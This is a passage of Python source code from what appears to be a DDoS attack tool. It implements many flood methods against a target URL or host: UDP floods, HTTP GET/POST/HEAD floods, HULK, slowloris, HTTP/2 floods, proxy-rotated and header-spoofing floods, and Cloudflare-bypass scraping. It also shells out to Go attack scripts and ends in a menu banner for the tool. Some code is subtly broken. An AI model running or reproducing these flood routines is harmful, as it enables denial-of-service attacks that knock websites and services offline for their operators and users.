def runsender(host, port, th, t):
 #   if payload == "":
 #       payload = random._urandom(1024)
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
 #   payload = Payloads[method]
    for _ in range(int(th)):
        try:
            thd = threading.Thread(target=sender, args=(host, port, until, payload))
            thd.start()
        except:
            pass

def sender(host, port, until_datetime, payload):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        try:
   #         for _ in range(200):
            payload = random._urandom(1024)
            sock.sendto(payload, (host, int(port)))
        except:
            sock.close()
            pass



################################### engine METHOD ############################

# HEAD
def Launch(url, th, t, method): #testing
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    for _ in range(int(th)):
        try:
            exec("threading.Thread(target=Attack"+[method]+", args=(url, until)).start()")
        except:
            pass

def LaunchHEAD(url, th, t):
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    for _ in range(int(th)):
        try:
            thd = threading.Thread(target=AttackHEAD, args=(url, until))
            thd.start()
        except:
            pass

def AttackHEAD(url, until_datetime):
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        try:
            requests.head(url)
            requests.head(url)
        except:
            pass

# POST
def LaunchPOST(url, th, t):
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    for _ in range(int(th)):
        try:
            thd = threading.Thread(target=AttackPOST, args=(url, until))
            thd.start()
        except:
            pass

def AttackPOST(url, until_datetime):
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        try:
            requests.post(url)
            requests.post(url)
        except:
            pass

# RAW
def LaunchRAW(url, th, t):
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    for _ in range(int(th)):
        try:
            thd = threading.Thread(target=AttackRAW, args=(url, until))
            thd.start()
        except:
            pass

def AttackRAW(url, until_datetime):
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        try:
            requests.get(url)
            requests.get(url)
        except:
            pass

# strike
def LaunchStrike(url, th, t):
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    for _ in range(int(th)):
        try:
            thd = threading.Thread(target=AttackStrike, args=(url, until))
            thd.start()
        except:
            pass

def AttackStrike(url, until_datetime):
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        try:
            os.system(f'cd godzilla && go run strike.go -url {url} GET')
        except IndexError:
            #pass
            print('Usage: strike <url> <method> GET')
            print('Example: strike https://example.com GET')

# PXRAW
def LaunchPXRAW(url, th, t):
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    for _ in range(int(th)):
        try:
            thd = threading.Thread(target=AttackPXRAW, args=(url, until))
            thd.start()
        except:
            pass

def AttackPXRAW(url, until_datetime):

    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        proxy = 'http://'+str(random.choice(list(proxies)))
        proxy = {
            'http': proxy,
            'https': proxy,
        }
        try:
            requests.get(url, proxies=proxy)
            requests.get(url, proxies=proxy)
        except:
            pass

# PXSOC
def LaunchPXSOC(url, th, t):
    target = get_target(url)
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    m = random.choice(method)
    user_agent = random.choice(useragents)
    req =  m + url+target['uri'] + " HTTP/1.1\r\n"
    req += "Host: " + target['host'] + "\r\n"
    req += user_agent +"\r\n"
    req += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\n'"
    req += "Connection: Keep-Alive\r\n\r\n"
    for _ in range(int(th)):
        try:
            thd = threading.Thread(target=AttackPXSOC, args=(target, until, req))
            thd.start()
        except:
            pass

def AttackPXSOC(target, until_datetime, req):
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        try:
            proxy = random.choice(list(proxies)).split(":")
            if target['scheme'] == 'https':
                s = socket.socket()
                s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
                s.set_proxy(socks.HTTP, str(proxy[0]), int(proxy[1]))
                s.connect((str(target['host']), int(target['port'])))
                s = ssl.create_default_context().wrap_socket(s, server_hostname=target['host'])
            else:
                s = socket.socket()
                s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
                s.set_proxy(socks.HTTP, str(proxy[0]), int(proxy[1]))
                s.connect((str(target['host']), int(target['port'])))
            try:
                for _ in range(100):
                    s.send(str.encode(req))
            except:
                s.close()
        except:
            return

# SOC
def LaunchSOC(url, th, t):
    target = get_target(url)
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    m = random.choice(method)
    user_agent = random.choice(useragents)
    req =  m + url+target['uri']+" HTTP/1.1\r\nHost: " + target['host'] + "\r\n"
    req += user_agent +"\r\n"
    req += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\n'"
    req += "Connection: Keep-Alive\r\n\r\n"
    for _ in range(int(th)):
        try:
            thd = threading.Thread(target=AttackSOC, args=(target, until, req))
            thd.start()
        except:
            pass

def AttackSOC(target, until_datetime, req):
    try:
        # print(f"Connecting to {target['host']} on port {target['port']} with scheme {target['scheme']}")

        if target['scheme'] == 'https':
            s = socket.socket()
            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            s.connect((str(target['host']), int(target['port'])))
            s = ssl.create_default_context().wrap_socket(s, server_hostname=target['host'])
        else:
            s = socket.socket()
            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            s.connect((str(target['host']), int(target['port'])))
        
        while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
            try:
                for _ in range(100):
                    s.send(str.encode(req))
            except Exception as e:
                print(f"Error during sending data: {e}")
                break
                
    except Exception as e:
        print(f"Error during connection setup: {e}")
        
    finally:
        if 's' in locals():
            s.close()  # Ensure the socket is closed at the end

#hulk
def LaunchHULK(url, th, t):
    target = get_target(url)
    user_agent = random.choice(useragents)
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    m = random.choice(method)
    
    # Construct the HTTP request string
    req = (
        f"{m} {url}{target['uri']}?{random.randint(1, 1000)}={random.randint(1, 1000)} HTTP/1.1\r\n"
        f"Host: {target['host']}\r\n"
        f"User-Agent: {user_agent}\r\n"
        "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\n"
        "Connection: Keep-Alive\r\n"
        "Cache-Control: no-cache\r\n\r\n"
    )

    for _ in range(int(th)):
        try:
            thd = threading.Thread(target=AttackHULK, args=(target, until, req))
            thd.start()
        except Exception as e:
            print(f"Thread error: {e}")  # Add debugging info if a thread fails to start

def AttackHULK(target, until_datetime, req):
    try:
        if target['scheme'] == 'https':
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            s.connect((target['host'], target['port']))
            s = ssl.create_default_context().wrap_socket(s, server_hostname=target['host'])
        else:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            s.connect((target['host'], target['port']))

        while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
            try:
                s.sendall(req.encode('utf-8'))  # sendall is safer for sending complete data
            except Exception as e:
                print(f"Send error: {e}")
                break  # Exit loop on error

    except Exception as e:
        print(f"Connection error: {e}")

    finally:
        s.close()  # Ensure the socket is always closed


# CFB
def LaunchCFB(url, th, t):
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    scraper = attack_script.create_scraper()
    for _ in range(int(th)):
        try:
            thd = threading.Thread(target=AttackCFB, args=(url, until, scraper))
            thd.start()
        except:
            pass

def AttackCFB(url, until_datetime, scraper):
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
     for _ in range(100):
        try:
            scraper.get(url, timeout=5)
            scraper.post(url, timeout=5)
            scraper.head(url, timeout=5)
        except:
            pass

#getCOOOKIE PXCFB
def attackPXCFB(url, timer, threads):
    for i in range(int(threads)):
        threading.Thread(target=LaunchPXCFB, args=(url, timer)).start()

def LaunchPXCFB(url, timer):
    prox = open("./http.txt", 'r').read().split('\n')
    proxy = random.choice(prox).strip().split(":")
    timelol = time.time() + int(timer)
    m = random.choice(method)
    user_agent = random.choice(useragents)
    req =  m + url+" / HTTP/1.3\r\nHost: " + urlparse(url).netloc + "\r\n"
    req += "Cache-Control: no-cache\r\n"
    req += user_agent +"\r\n"
    req += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\n'"
    req += "Sec-Fetch-Site: same-origin\r\n"
    req += "Sec-GPC: 1\r\n"
    req += "Sec-Fetch-Mode: navigate\r\n"
    req += "Sec-Fetch-Dest: document\r\n"
    req += "Upgrade-Insecure-Requests: 1\r\n"
    req += "Connection: Keep-Alive\r\n\r\n"
    while time.time() < timelol:
        try:
            s = socket.socket()
            s.set_proxy(socks.HTTP, str(proxy[0]), int(proxy[1]))
            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            s.connect((str(urlparse(url).netloc), int(443)))
            ctx = ssl.create_default_context()
            cipher = [':ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:DHE-DSS-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-DSS-AES128-SHA256:DHE-RSA-AES256-SHA256:DHE-DSS-AES256-SHA:DHE-RSA-AES256-SHA:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!3DES:!MD5:!PSK']
            ctx.set_ciphers(cipher)
            s = ctx.wrap_socket(s, server_hostname=urlparse(url).netloc)
            s.send(str.encode(req))
            try:
                for _ in range(200):
                    s.send(str.encode(req))
                    s.send(str.encode(req))
            except:
                s.close()
        except:
            s.close()

# CFPRO
def LaunchCFPRO(url, th, t):
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    session = requests.Session()
    scraper = attack_script.create_scraper(sess=session)
    jar = RequestsCookieJar()
    jar.set(cookieJAR['name'], cookieJAR['value'])
    scraper.cookies = jar
    for _ in range(int(th)):
        try:
            thd = threading.Thread(target=AttackCFPRO, args=(url, until, scraper))
            thd.start()
        except:
            pass

def AttackCFPRO(url, until_datetime, scraper):
    headers = {
        'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 10_3_3 like Mac OS X) AppleWebKit/603.3.8 (KHTML, like Gecko) Mobile/14G60 MicroMessenger/6.5.18 NetType/WIFI Language/en',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
        'Accept-Language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
        'Accept-Encoding': 'deflate, gzip;q=1.0, *;q=0.5',
        'Cache-Control': 'no-cache',
        'Pragma': 'no-cache',
        'Connection': 'keep-alive',
        'Upgrade-Insecure-Requests': '1',
        'Sec-Fetch-Dest': 'document',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-Site': 'same-origin',
        'Sec-Fetch-User': '?1',
        'TE': 'trailers',
    }
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        try:
            scraper.get(url=url, headers=headers, allow_redirects=False)
            scraper.get(url=url, headers=headers, allow_redirects=False)
        except:
            pass

#CFSOC
def LaunchCFSOC(url, th, t):
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    target = get_target(url)
#    cookie, user_agent = get_cookie(url)
    req =  'GET '+ target['uri'] +' HTTP/1.1\r\n'
    req += 'Host: ' + target['host'] + '\r\n'
    req += 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\n'
    req += 'Accept-Encoding: gzip, deflate, br\r\n'
    req += 'Accept-Language: ko,ko-KR;q=0.9,en-US;q=0.8,en;q=0.7\r\n'
    req += 'Cache-Control: max-age=0\r\n'
    req += 'Cookie: ' + cookie + '\r\n'
    req += f'sec-ch-ua: "Chromium";v="100", "Google Chrome";v="100"\r\n'
    req += 'sec-ch-ua-mobile: ?0\r\n'
    req += 'sec-ch-ua-platform: "Windows"\r\n'
    req += 'sec-fetch-dest: empty\r\n'
    req += 'sec-fetch-mode: cors\r\n'
    req += 'sec-fetch-site: same-origin\r\n'
    req += 'Connection: Keep-Alive\r\n'
    req += 'User-Agent: ' + useragent + '\r\n\r\n\r\n'
    for _ in range(int(th)):
        try:
            thd = threading.Thread(target=AttackCFSOC,args=(until, target, req,))
            thd.start()
        except:
            pass

def AttackCFSOC(until_datetime, target, req):
    if target['scheme'] == 'https':
        packet = socket.ksocket()
        packet.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        packet.connect((str(target['host']), int(target['port'])))
        packet = ssl.create_default_context().wrap_socket(packet, server_hostname=target['host'])
    else:
        packet = socket.socket()
        packet.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        packet.connect((str(target['host']), int(target['port'])))
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        try:
            for _ in range(10):
                packet.send(str.encode(req))
        except:
            packet.close()
            pass


# slowloris attack
def attackslow(url, timer, threads):
    for i in range(int(threads)):
        threading.Thread(target=Launchslow, args=(url, timer)).start()

def Launchslow(url, timer):
    socksCrawler()  # Fetches the proxy list
    prox = open("./socks5.txt", 'r').read().split('\n')
    proxy = random.choice(prox).strip().split(":")
    timelol = time.time() + int(timer)
    m = random.choice(method)
    user_agent = random.choice(useragents)
    
    # Construct the initial request headers
    req = (
        f"{m} {url} HTTP/1.1\r\n"
        f"Host: {urlparse(url).netloc}\r\n"
        f"User-Agent: {user_agent}\r\n"
        "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\n"
        "Sec-Fetch-Site: same-origin\r\n"
        "Sec-GPC: 1\r\n"
        "Sec-Fetch-Mode: navigate\r\n"
        "Sec-Fetch-Dest: document\r\n"
        "Upgrade-Insecure-Requests: 1\r\n"
        "Connection: Keep-Alive\r\n"
        "Cache-Control: no-cache\r\n\r\n"
    )
    
    while time.time() < timelol:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            
            # Set up proxy if needed
            s.connect((str(proxy[0]), int(proxy[1])))
            ctx = ssl.create_default_context()
            s = ctx.wrap_socket(s, server_hostname=urlparse(url).netloc)
            
            # Send the initial request
            s.sendall(req.encode('utf-8'))
            
            # Keep sending small packets every 14 seconds to keep the connection alive
            while time.time() < timelol:
                time.sleep(14)
                try:
                    s.send("X-a: {}\r\n".format(random.randint(1, 5000)).encode("utf-8"))
                except Exception as e:
                    print(f"Error during sending keep-alive: {e}")
                    break  # Break if there's an error in sending keep-alive packets
        except Exception as e:
            print(f"Connection error: {e}")
        finally:
            s.close()  # Ensure the socket is closed after each connection attempt

#http2
def attackhttp2(url, timer, threads):
    for i in range(int(threads)):
        threading.Thread(target=Launchhttp2, args=(url, timer)).start()

def Launchhttp2(url, timer):
    # Ensure the URL has the correct protocol
    if not url.startswith(('http://', 'https://')):
        url = 'https://' + url  # Default to 'http://' if no protocol is provided

    timelol = time.time() + int(timer)
    
    # Load proxies from the file
    proxfile1 = 'http.txt'
    with open(proxfile1, 'r') as f:
        prox1 = [line.strip() for line in f if line.strip()]
    
    # Ensure that the proxies list is not empty
    if not prox1:
        print(f"No proxies found in {proxfile1}. Exiting.")
        return
    
    headers = {
        'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 10_3_3 like Mac OS X) AppleWebKit/603.3.8 (KHTML, like Gecko) Mobile/14G60 MicroMessenger/6.5.18 NetType/WIFI Language/en',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
        'Accept-Language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
        'Accept-Encoding': 'deflate, gzip;q=1.0, *;q=0.5',
        'Cache-Control': 'no-cache',
        'Pragma': 'no-cache',
        'Connection': 'keep-alive',
        'Upgrade-Insecure-Requests': '1',
        'Sec-Fetch-Dest': 'document',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-Site': 'same-origin',
        'Sec-Fetch-User': '?1',
        # 'TE': 'trailers',  # Uncomment if needed
    }
    
    # Create and configure the HTTP client
    while time.time() < timelol:
        proxy1 = random.choice(prox1)
        proxies = {'http://': f'http://{proxy1}', 'https://': f'http://{proxy1}'}

        with httpx.Client(http2=True, proxies=proxies, headers=headers, trust_env=False) as client:
            try:
                for _ in range(400):  # Adjust this loop as necessary
                    r1 = client.get(url)
                    r2 = client.post(url, data={'login': random.randint(65565, 314159)})
                    r3 = client.put(url, data={'login': random.randint(65565, 314159)})
                    r5 = client.head(url)
            except httpx.HTTPError as exc:
                print(f"HTTP error occurred: {exc}")

#spoof
def spoofer():
    addr = [192, 168, 0, 1]
    d = '.'
    addr[0] = str(random.randrange(11, 197))
    addr[1] = str(random.randrange(0, 255))
    addr[2] = str(random.randrange(0, 255))
    addr[3] = str(random.randrange(2, 254))
    assemebled = addr[0] + d + addr[1] + d + addr[2] + d + addr[3]
    return assemebled

#spoof method #
def attackspoof(url, timer, threads):
    for i in range(int(threads)):
        threading.Thread(target=Launchspoof, args=(url, timer)).start()

def Launchspoof(url, timer):
    socksCrawler()
    prox = open("./socks5.txt", 'r').read().split('\n')
    proxy = random.choice(prox).strip().split(":")
    timelol = time.time() + int(timer)
    m = random.choice(method)
    user_agent = random.choice(useragents)
    req =  m + url+" / HTTP/1.1\r\nHost: " + urlparse(url).netloc + "\r\n"
    req += user_agent +"\r\n"
    req += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\n'"
    req += "X-Forwarded-Proto: Http\r\n"
    req += "X-Forwarded-Host: "+urlparse(url).netloc+", 1.1.1.1\r\n"
    req += "Via: "+spoofer()+"\r\n"
    req += "Client-IP: "+spoofer()+"\r\n"
    req += "X-Forwarded-For: "+spoofer()+"\r\n"
    req += "Real-IP: "+spoofer()+"\r\n"
    req += "Connection: Keep-Alive\r\n\r\n"
    while time.time() < timelol:
        try:
            s = socket.socket()
            s.connect((str(urlparse(url).netloc), int(443)))
            s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
            ctx = ssl.SSLContext()
            s = ctx.wrap_socket(s, server_hostname=urlparse(url).netloc)
            s.send(str.encode(req))
            try:
                for i in range(200):
                    s.send(str.encode(req))
                    s.send(str.encode(req))
            except:
                s.close()
        except:
            s.close()

#sky
def attackSKY(url, timer, threads):
    for i in range(int(threads)):
        threading.Thread(target=LaunchSKY, args=(url, timer)).start()

def LaunchSKY(url, timer):
    socksCrawler()
    prox = open("./socks5.txt", 'r').read().split('\n')
    proxy = random.choice(prox).strip().split(":")
    timelol = time.time() + int(timer)
    m = random.choice(method)
    user_agent = random.choice(useragents)
    req =  m + url+" HTTP/1.1\r\nHost: " + urlparse(url).netloc + "\r\n"
    req += "Cache-Control: no-cache\r\n"
    req += user_agent +"\r\n"
    req += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\n'"
    req += "Sec-Fetch-Site: same-origin\r\n"
    req += "Sec-GPC: 1\r\n"
    req += "Sec-Fetch-Mode: navigate\r\n"
    req += "Sec-Fetch-Dest: document\r\n"
    req += "Upgrade-Insecure-Requests: 1\r\n"
    req += "Connection: Keep-Alive\r\n\r\n"
    while time.time() < timelol:
        try:
            s = socket.socket()
            s.connect((str(urlparse(url).netloc), int(443)))
            s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
            ctx = ssl.SSLContext()
            s = ctx.wrap_socket(s, server_hostname=urlparse(url).netloc)
            s.send(str.encode(req))
            try:
                for i in range(200):
                    s.send(str.encode(req))
                    s.send(str.encode(req))
            except:
                s.close()
        except:
            s.close()

#pxhulk
def attackPXHULK(url, timer, threads):
    for i in range(int(threads)):
        threading.Thread(target=LaunchPXHULK, args=(url, timer)).start()

def LaunchPXHULK(url, timer):
    socksCrawler()
    prox = open("./socks5.txt", 'r').read().split('\n')
    proxy = random.choice(prox).strip().split(":")
    timelol = time.time() + int(timer)
    m = random.choice(method)
    user_agent = random.choice(useragents)
    req =  m + url+"?="+ str(random.randint(1,1000))+"="+str(random.randint(1,1000))+" / HTTP/1.1\r\nHost: " + urlparse(url).netloc + "\r\n"
    req += "Cache-Control: no-cache\r\n"
    req += user_agent +"\r\n"
    req += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\n'"
    req += "Sec-Fetch-Site: same-origin\r\n"
    req += "Sec-GPC: 1\r\n"
    req += "Sec-Fetch-Mode: navigate\r\n"
    req += "Sec-Fetch-Dest: document\r\n"
    req += "Upgrade-Insecure-Requests: 1\r\n"
    req += "Connection: Keep-Alive\r\n\r\n"
    while time.time() < timelol:
        try:
            s = socket.socket()
            s.connect((str(urlparse(url).netloc), int(443)))
            s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
            ctx = ssl.SSLContext()
            s = ctx.wrap_socket(s, server_hostname=urlparse(url).netloc)
            s.send(str.encode(req))
            try:
                for i in range(200):
                    s.send(str.encode(req))
                    s.send(str.encode(req))
            except:
                s.close()
        except:
            s.close()

#bypass
def attackbypass(url, timer, threads):
    for i in range(int(threads)):
        threading.Thread(target=Launchbypass, args=(url, timer)).start()

def Launchbypass(url, timer):
    prox = open("./http.txt", 'r').read().split('\n')
    proxy = random.choice(prox).strip().split(":")
    timelol = time.time() + int(timer)
    m = random.choice(method)
    user_agent = random.choice(useragents)
    req =  m + url+" / HTTP/1.1\r\nHost: " + urlparse(url).netloc + "\r\n"
    req += "Cache-Control: no-cache\r\n"
    req += user_agent +"\r\n"
    req += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\n'"
    req += "Sec-Fetch-Site: same-origin\r\n"
    req += "Sec-GPC: 1\r\n"
    req += "Sec-Fetch-Mode: navigate\r\n"
    req += "Sec-Fetch-Dest: document\r\n"
    req += "Upgrade-Insecure-Requests: 1\r\n"
    req += "Connection: Keep-Alive\r\n\r\n"
    while time.time() < timelol:
        try:
            s = socket.socket()
            s.set_proxy(socks.HTTP, str(proxy[0]), int(proxy[1]))
            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            s.connect((str(urlparse(url).netloc), int(443)))
            ctx = ssl.SSLContext()
            s = ctx.wrap_socket(s, server_hostname=urlparse(url).netloc)
            s.send(str.encode(req))
            try:
                for _ in range(200):
                    s.send(str.encode(req))
                    s.send(str.encode(req))
            except:
                s.close()
        except:
            s.close()

#STELLAR
def attackSTELLAR(url, timer, threads):
    for i in range(int(threads)):
        threading.Thread(target=LaunchSTELLAR, args=(url, timer)).start()

def LaunchSTELLAR(url, timer):
    timelol = time.time() + int(timer)
    m = random.choice(method)
    user_agent = random.choice(useragents)
    req =  m + url+" / HTTP/1.1\r\nHost: " + urlparse(url).netloc + "\r\n"
    req += "Cache-Control: no-cache\r\n"
    req += user_agent +"\r\n"
    req += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\n'"
    req += "Sec-Fetch-Site: same-origin\r\n"
    req += "Sec-GPC: 1\r\n"
    req += "Sec-Fetch-Mode: navigate\r\n"
    req += "Sec-Fetch-Dest: document\r\n"
    req += "Upgrade-Insecure-Requests: 1\r\n"
    req += "Connection: Keep-Alive\r\n\r\n"
    while time.time() < timelol:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((str(urlparse(url).netloc), int(443)))
            ctx = ssl.SSLContext()
            s = ctx.wrap_socket(s, server_hostname=urlparse(url).netloc)
            s.send(str.encode(req))
            try:
                for i in range(200):
                    s.send(str.encode(req))
                    s.send(str.encode(req))
            except:
                s.close()
        except:
            s.close()

#tlz

def Launchtlz(url, th, t):
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    for _ in range(int(th)):
        try:
            thd = threading.Thread(target=Attacktlz, args=(url, until))
            thd.start()
        except:
            pass

def Attacktlz(url, until_datetime):
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        try:
            os.system(f'cd godzilla && go run TLZ.go -url {url} GET')
        except IndexError:
            #pass
            print('coba comprobar de nuevo')
            print('udah bener belum ngisi nya')


def humanbytes(i: int, binary: bool = False, precision: int = 2):
    MULTIPLES = [
        "B", "k{}B", "M{}B", "G{}B", "T{}B", "P{}B", "E{}B", "Z{}B", "Y{}B"
    ]
    if i > 0:
        base = 1024 if binary else 1000
        multiple = trunc(log2(i) / log2(base))
        value = i / pow(base, multiple)
        suffix = MULTIPLES[multiple].format("i" if binary else "")
        return f"{value:.{precision}f} {suffix}"
    else:
        return "-- B"

def humanformat(num: int, precision: int = 2):
        suffixes = ['', 'k', 'm', 'g', 't', 'p']
        if num > 999:
            obje = sum(
                [abs(num / 1000.0 ** x) >= 1 for x in range(1, len(suffixes))])
            return f'{num / 1000.0 ** obje:.{precision}f}{suffixes[obje]}'
        else:
            return num
        
def info(domain):
    try:
        response = get(f"https://ipwhois.app/json/{domain}/")
        return response.json()
    except Exception as e:
        return {"success": False, "error": str(e)}


######################################################### bagian mesin habis ###########################################################################

def clear():
    if name == 'nt':
        system('cls')
    else:
        system('clear')

########################################################## TAMPILAN ####################################################################################

def help():
    clear ()
    stdout.write("                                                                                           \n")
    stdout.write("                                                                                           \n")
    stdout.write("    "+Fore.LIGHTWHITE_EX  +"        ██╗  ██╗███████╗██╗     ██████╗    \n")
    stdout.write("    "+Fore.LIGHTBLUE_EX  +"         ██║  ██║██╔════╝██║     ██╔══██╗   \n")
    stdout.write("    "+Fore.LIGHTBLUE_EX  +"         ███████║█████╗  ██║     ██████╔╝   \n")
    stdout.write("    "+Fore.LIGHTBLUE_EX  +"         ██╔══██║██╔══╝  ██║     ██╔═══╝    \n")
    stdout.write("    "+Fore.LIGHTBLUE_EX  +"         ██║  ██║███████╗███████╗██║        \n")
    stdout.write("    "+Fore.LIGHTBLUE_EX  +"         ╚═╝  ╚═╝╚══════╝╚══════╝╚═╝        \n")
    stdout.write("    "+Fore.LIGHTBLUE_EX  +"        ══╦═══════════════════════╦══\n")
    stdout.write("    "+Fore.LIGHTBLUE_EX  +"╔═════════╩═══════════════════════╩═════════╗\n")
    stdout.write("    "+Fore.LIGHTBLUE_EX  +"║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"l71   "+Fore.LIGHTBLUE_EX+"|"+Fore.LIGHTWHITE_EX +" Show Layer7 Methods (page 1) "+Fore.LIGHTBLUE_EX+"   ║\n")
    stdout.write("    "+Fore.LIGHTBLUE_EX  +"║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"l72   "+Fore.LIGHTBLUE_EX+"|"+Fore.LIGHTWHITE_EX +" Show Layer7 Methods (page 2) "+Fore.LIGHTBLUE_EX+"   ║\n")
    stdout.write("    "+Fore.LIGHTBLUE_EX  +"║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"l4    "+Fore.LIGHTBLUE_EX+"|"+Fore.LIGHTWHITE_EX +" Show Layer4 Methods "+Fore.LIGHTBLUE_EX+"            ║\n")
    stdout.write("    "+Fore.LIGHTBLUE_EX  +"║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"tools "+Fore.LIGHTBLUE_EX+"|"+Fore.LIGHTWHITE_EX +" Show tools          "+Fore.LIGHTBLUE_EX+"            ║\n")
    stdout.write("    "+Fore.LIGHTBLUE_EX  +"║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"credit"+Fore.LIGHTBLUE_EX+"|"+Fore.LIGHTWHITE_EX +" Show credit         "+Fore.LIGHTBLUE_EX+"            ║\n")
    stdout.write("    "+Fore.LIGHTBLUE_EX  +"║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"exit  "+Fore.LIGHTBLUE_EX+"|"+Fore.LIGHTWHITE_EX +" Exit                "+Fore.LIGHTBLUE_EX+"            ║\n")
    stdout.write("    "+Fore.LIGHTBLUE_EX  +"╠═══════════════════════════════════════════╣\n")
